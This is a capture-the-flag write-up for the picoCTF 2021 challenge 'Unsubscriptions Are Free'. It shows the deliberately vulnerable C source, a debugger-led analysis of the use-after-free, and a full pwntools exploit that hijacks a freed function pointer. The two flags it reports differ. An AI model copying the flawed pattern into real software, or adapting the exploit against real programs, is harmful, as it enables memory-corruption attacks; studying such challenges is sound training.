---
name: Unsubscriptions Are Free (2021)
event: Pico CTF 2021
category: Pwn
description: Writeup for Unsubscriptions Are Free (pwn) - Pico CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Unsubscriptions Are Free

## Video Walkthrough

[![VIDEO WALKTHROUGH](https://img.youtube.com/vi/YGQAvJ__12k/0.jpg)](https://www.youtube.com/watch?v=YGQAvJ__12k "Unsubscriptions Are Free")

## Description

> Check out my new video-game and spaghetti-eating streaming channel on Twixer!

## Source

{% code overflow="wrap" %}
```c
#include <ctype.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define FLAG_BUFFER 200
#define LINE_BUFFER_SIZE 20

typedef struct {
  uintptr_t (*whatToDo)();
  char *username;
} cmd;

char choice;
cmd *user;

void hahaexploitgobrrr() {
  char buf[FLAG_BUFFER];
  FILE *f = fopen("flag.txt", "r");
  fgets(buf, FLAG_BUFFER, f);
  fprintf(stdout, "%s\n", buf);
  fflush(stdout);
}

char *getsline(void) {
  getchar();
  char *line = malloc(100), *linep = line;
  size_t lenmax = 100, len = lenmax;
  int c;
  if (line == NULL)
    return NULL;
  for (;;) {
    c = fgetc(stdin);
    if (c == EOF)
      break;
    if (--len == 0) {
      len = lenmax;
      char *linen = realloc(linep, lenmax *= 2);

      if (linen == NULL) {
        free(linep);
        return NULL;
      }
      line = linen + (line - linep);
      linep = linen;
    }

    if ((*line++ = c) == '\n')
      break;
  }
  *line = '\0';
  return linep;
}

void doProcess(cmd *obj) { (*obj->whatToDo)(); }

void s() {
  printf("OOP! Memory leak...%p\n", hahaexploitgobrrr);
  puts("Thanks for subsribing! I really recommend becoming a premium member!");
}

void p() {
  puts("Membership pending... (There's also a super-subscription you can also "
       "get for twice the price!)");
}

void m() { puts("Account created."); }

void leaveMessage() {
  puts("I only read premium member messages but you can ");
  puts("try anyways:");
  char *msg = (char *)malloc(8);
  read(0, msg, 8);
}

void i() {
  char response;
  puts("You're leaving already(Y/N)?");
  scanf(" %c", &response);
  if (toupper(response) == 'Y') {
    puts("Bye!");
    free(user);
  } else {
    puts("Ok. Get premium membership please!");
  }
}

void printMenu() {
  puts("Welcome to my stream! ^W^");
  puts("==========================");
  puts("(S)ubscribe to my channel");
  puts("(I)nquire about account deletion");
  puts("(M)ake an Twixer account");
  puts("(P)ay for premium membership");
  puts("(l)eave a message(with or without logging in)");
  puts("(e)xit");
}

void processInput() {
  scanf(" %c", &choice);
  choice = toupper(choice);
  switch (choice) {
  case 'S':
    if (user) {
      user->whatToDo = (void *)s;
    } else {
      puts("Not logged in!");
    }
    break;
  case 'P':
    user->whatToDo = (void *)p;
    break;
  case 'I':
    user->whatToDo = (void *)i;
    break;
  case 'M':
    user->whatToDo = (void *)m;
    puts("===========================");
    puts("Registration: Welcome to Twixer!");
    puts("Enter your username: ");
    user->username = getsline();
    break;
  case 'L':
    leaveMessage();
    break;
  case 'E':
    exit(0);
  default:
    puts("Invalid option!");
    exit(1);
    break;
  }
}

int main() {
  setbuf(stdout, NULL);
  user = (cmd *)malloc(sizeof(user));
  while (1) {
    printMenu();
    processInput();
    // if(user){
    doProcess(user);
    //}
  }
  return 0;
}
```
{% endcode %}

## Solution

Challenge name indicates a Use After Free (UAF) vulnerability.

> Use-After-Free (UAF) is a vulnerability related to incorrect use of dynamic memory during program operation. If after freeing a memory location, a program does not clear the pointer to that memory, an attacker can use the error to hack the program.

Goal is to call the `hahaexploitgobrrr` function, printing the flag.

`main()` first mallocs a `user` object\* from the `cmd` struct, containing a function pointer `whatToDo` and a char pointer `username`.

\*32-bit binary, so the two pointers are 4 bytes each, and you would assume `malloc(8)`. However, ghidra shows `malloc(4)` because the code uses `(cmd *)malloc(sizeof(user))` where `user` is a 4 byte pointer. However, when we debug the program, we see a 16-byte chunk is assigned, so `malloc(16)`.

main() then indefinitely loops:

-   `printMenu()` - print menu options
-   `processInput()` - read user input
-   `doProcess(user)` - execute the current function pointed to by `user->whatToDo`

When we select a menu option, e.g. `S` the `user->whatToDo` function pointer is updated, to point at the relevant function, e.g. `s`:

**(S)** Leak `hahaexploitgobrrr` address\
**(I)** `free()` the `user` object\
**(M)** Create account, sets `user->username`\
**(P)** Print unimportant string\
**(L)** Leave a message, reads 8 bytes into new chunk (`malloc(8)`)\
**(E)** Exit the program

Let's re-order these menu options into an exploit:

**(S)** Leak `hahaexploitgobrrr` address\
**(I)** `free()` the `user` object\
**(L)** Leave a message, reads 8 bytes into new chunk (`malloc(8)`)

Breakdown: We'll leak (and capture) the `hahaexploitgobrrr` address. Next, we'll free the user object. Finally, we'll submit the `hahaexploitgobrrr` address as a message. `malloc(8)` will reuse the freed user chunk (UAF) and write the address into the `user->whatToDo` function pointer, which is continously executed by `doProcess(user)`.

We can set some breakpoints in GDB:

1. `break *0x8048d6f` - After `user = (cmd *)malloc(sizeof(user))` in `main()`
2. `break *0x8048aff` - After `free(user)` in `i()`
3. `break *0x8048a61` - After `char* msg = (char*)malloc(8)` in `leaveMessage()`

The **first breakpoint** shows the address of the `user` chunk (`0x95cd1a0`), returned to the `EAX` by malloc.

{% code overflow="wrap" %}
```sh
─────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
 EAX  0x95cd1a0 ◂— 0x0
 EBX  0x804b000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804af0c (_DYNAMIC) ◂— 0x1
 ECX  0x0
 EDX  0x4
 EDI  0xf7eb8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7eb8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 EBP  0xffafe2a8 ◂— 0x0
 ESP  0xffafe290 ◂— 0x4
 EIP  0x8048d6f (main+58) ◂— add    esp, 0x10
──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────
 ► 0x8048d6f <main+58>    add    esp, 0x10
   0x8048d72 <main+61>    mov    edx, eax
   0x8048d74 <main+63>    mov    eax, user                     <0x804b060>
   0x8048d7a <main+69>    mov    dword ptr [eax], edx
   0x8048d7c <main+71>    call   printMenu                     <printMenu>

   0x8048d81 <main+76>    call   processInput                     <processInput>

   0x8048d86 <main+81>    mov    eax, user                     <0x804b060>
   0x8048d8c <main+87>    mov    eax, dword ptr [eax]
   0x8048d8e <main+89>    sub    esp, 0xc
   0x8048d91 <main+92>    push   eax
   0x8048d92 <main+93>    call   doProcess                     <doProcess>
```
{% endcode %}

The chunk size is 16.

0x11 is 17, but the 1 is a flag to indicate the previous chunk is not free.

{% code overflow="wrap" %}
```sh
pwndbg> x/8wx 0x95cd1a0 - 4
0x95cd19c:	0x00000011	0x00000000	0x00000000	0x00000000
0x95cd1ac:	0x00021e59	0x00000000	0x00000000	0x00000000
```
{% endcode %}

We'll create a user "crypto" and check the chunk again.

{% code overflow="wrap" %}
```sh
pwndbg> x/8wx 0x95cd1a0 - 4
0x95cd19c:	0x00000011	0x080489f6	0x095ce1c0	0x00000000
0x95cd1ac:	0x00001011	0x70797263	0x000a6f74	0x00000000
```
{% endcode %}

The next 4 bytes after the chunk size (`0x080489f6`) hold the `user->whatToDo` function pointer.

{% code overflow="wrap" %}
```sh
pwndbg> x 0x080489f6
0x80489f6 <m>:	0x53e58955
```
{% endcode %}

The next 4 bytes after that hold the `user->username` char pointer.

{% code overflow="wrap" %}
```sh
pwndbg> x/gx 0x095ce1c0
0x95ce1c0:	0x000a6f7470797263
```
{% endcode %}

{% code overflow="wrap" %}
```sh
pwndbg> unhex a6f7470797263

otpyrc
```
{% endcode %}

**Second breakpoint**, after the user chunk has been freed.

{% code overflow="wrap" %}
```sh
─────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
*EAX  0x0
 EBX  0x804b000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804af0c (_DYNAMIC) ◂— 0x1
*ECX  0x95cd010 ◂— 0x1
*EDX  0x0
 EDI  0xf7eb8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7eb8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 EBP  0xffafe278 —▸ 0xffafe288 —▸ 0xffafe2a8 ◂— 0x0
*ESP  0xffafe250 —▸ 0x95cd1a0 ◂— 0x0
*EIP  0x8048aff (i+128) ◂— add    esp, 0x10
──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────
 ► 0x8048aff <i+128>          add    esp, 0x10
   0x8048b02 <i+131>          jmp    i+151                     <i+151>
    ↓
   0x8048b16 <i+151>          nop
   0x8048b17 <i+152>          mov    eax, dword ptr [ebp - 0xc]
   0x8048b1a <i+155>          xor    eax, dword ptr gs:[0x14]
   0x8048b21 <i+162>          je     i+169                     <i+169>
    ↓
   0x8048b28 <i+169>          mov    ebx, dword ptr [ebp - 4]
   0x8048b2b <i+172>          leave
   0x8048b2c <i+173>          ret

   0x8048b2d <printMenu>      push   ebp
   0x8048b2e <printMenu+1>    mov    ebp, esp
```
{% endcode %}

We can check the chunk data again.

{% code overflow="wrap" %}
```sh
pwndbg> x/8wx 0x95cd1a0 - 4
0x95cd19c:	0x00000011	0x00000000	0x095cd010	0x00000000
0x95cd1ac:	0x00001011	0x70790a59	0x000a6f74	0x00000000
```
{% endcode %}

Notice the `user->whatToDo` function pointer is now empty because the first word in a free chunk holds the previous free chunk's address (prev_ptr). However, the username remains.

We can check the heap and see that our free chunk is in the `tcache`.

{% code overflow="wrap" %}
```sh
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x95cd008
Size: 0x191

Free chunk (tcache) | PREV_INUSE
Addr: 0x95cd198
Size: 0x11
fd: 0x00

Allocated chunk | PREV_INUSE
Addr: 0x95cd1a8
Size: 0x1011

Allocated chunk | PREV_INUSE
Addr: 0x95ce1b8
Size: 0x71

Top chunk | PREV_INUSE
Addr: 0x95ce228
Size: 0x20dd9
```
{% endcode %}

**Third breakpoint**, after a new 8 byte chunk is allocated by malloc.

{% code overflow="wrap" %}
```sh
─────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
*EAX  0x95cd1a0 ◂— 0x0
 EBX  0x804b000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804af0c (_DYNAMIC) ◂— 0x1
*ECX  0x20
 EDX  0x0
 EDI  0xf7eb8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7eb8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
*EBP  0xffafe288 —▸ 0xffafe298 —▸ 0xffafe2a8 ◂— 0x0
*ESP  0xffafe260 ◂— 0x8
*EIP  0x8048a61 (leaveMessage+64) ◂— add    esp, 0x10
──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────
 ► 0x8048a61 <leaveMessage+64>    add    esp, 0x10
   0x8048a64 <leaveMessage+67>    mov    dword ptr [ebp - 0xc], eax
   0x8048a67 <leaveMessage+70>    sub    esp, 4
   0x8048a6a <leaveMessage+73>    push   8
   0x8048a6c <leaveMessage+75>    push   dword ptr [ebp - 0xc]
   0x8048a6f <leaveMessage+78>    push   0
   0x8048a71 <leaveMessage+80>    call   read@plt                     <read@plt>

   0x8048a76 <leaveMessage+85>    add    esp, 0x10
   0x8048a79 <leaveMessage+88>    nop
   0x8048a7a <leaveMessage+89>    mov    ebx, dword ptr [ebp - 4]
   0x8048a7d <leaveMessage+92>    leave
```
{% endcode %}

`malloc(8)` has returned `0x95cd1a0`, the same address as our previous chunk. Hence we are using-after-free when we write our message. We submit the leaked `hahaexploitgobrrr` function address, overwriting `user->whatToDo`. The infinite loop in main executes `doProcess(user)`, triggering the `hahaexploitgobrrr` function and printing the flag.

{% code overflow="wrap" %}
```sh
python exploit.py REMOTE mercury.picoctf.net 61817
[+] Opening connection to mercury.picoctf.net on port 61817: Done
[*] leaked hahaexploitgobrrr() address: 0x80487d6
[!] picoCTF{d0ubl3_j30p4rdy_1e154727}
[*] Closed connection to mercury.picoctf.net port 61817
```
{% endcode %}

## Solution

{% code overflow="wrap" %}
```py
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x8048d6f
break *0x8048aff
break *0x8048a61
continue
'''.format(**locals())

# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Create user (not needed, just for demo)
io.sendlineafter(b'(e)xit', b'M')
io.sendlineafter(b':', b'crypto')

# Leak memory (win address)
io.sendlineafter(b'(e)xit', b'S')
io.recvuntil(b'OOP! Memory leak...', drop=True)
leak = int(io.recvlineS(), 16)
info("leaked hahaexploitgobrrr() address: %#x", leak)

# Free the user
io.sendlineafter(b'(e)xit', b'I')
io.sendlineafter(b'?', b'Y')

# Leave a message (leaked address)
# The freed chunk will be reused
io.sendlineafter(b'(e)xit', b'L')
io.sendlineafter(b':', flat(leak))

# Got Flag?
warn(io.recvlines(2)[1].decode())
```
{% endcode %}

Flag: `picoCTF{d0ubl3_j30p4rdy_ba307b82}`
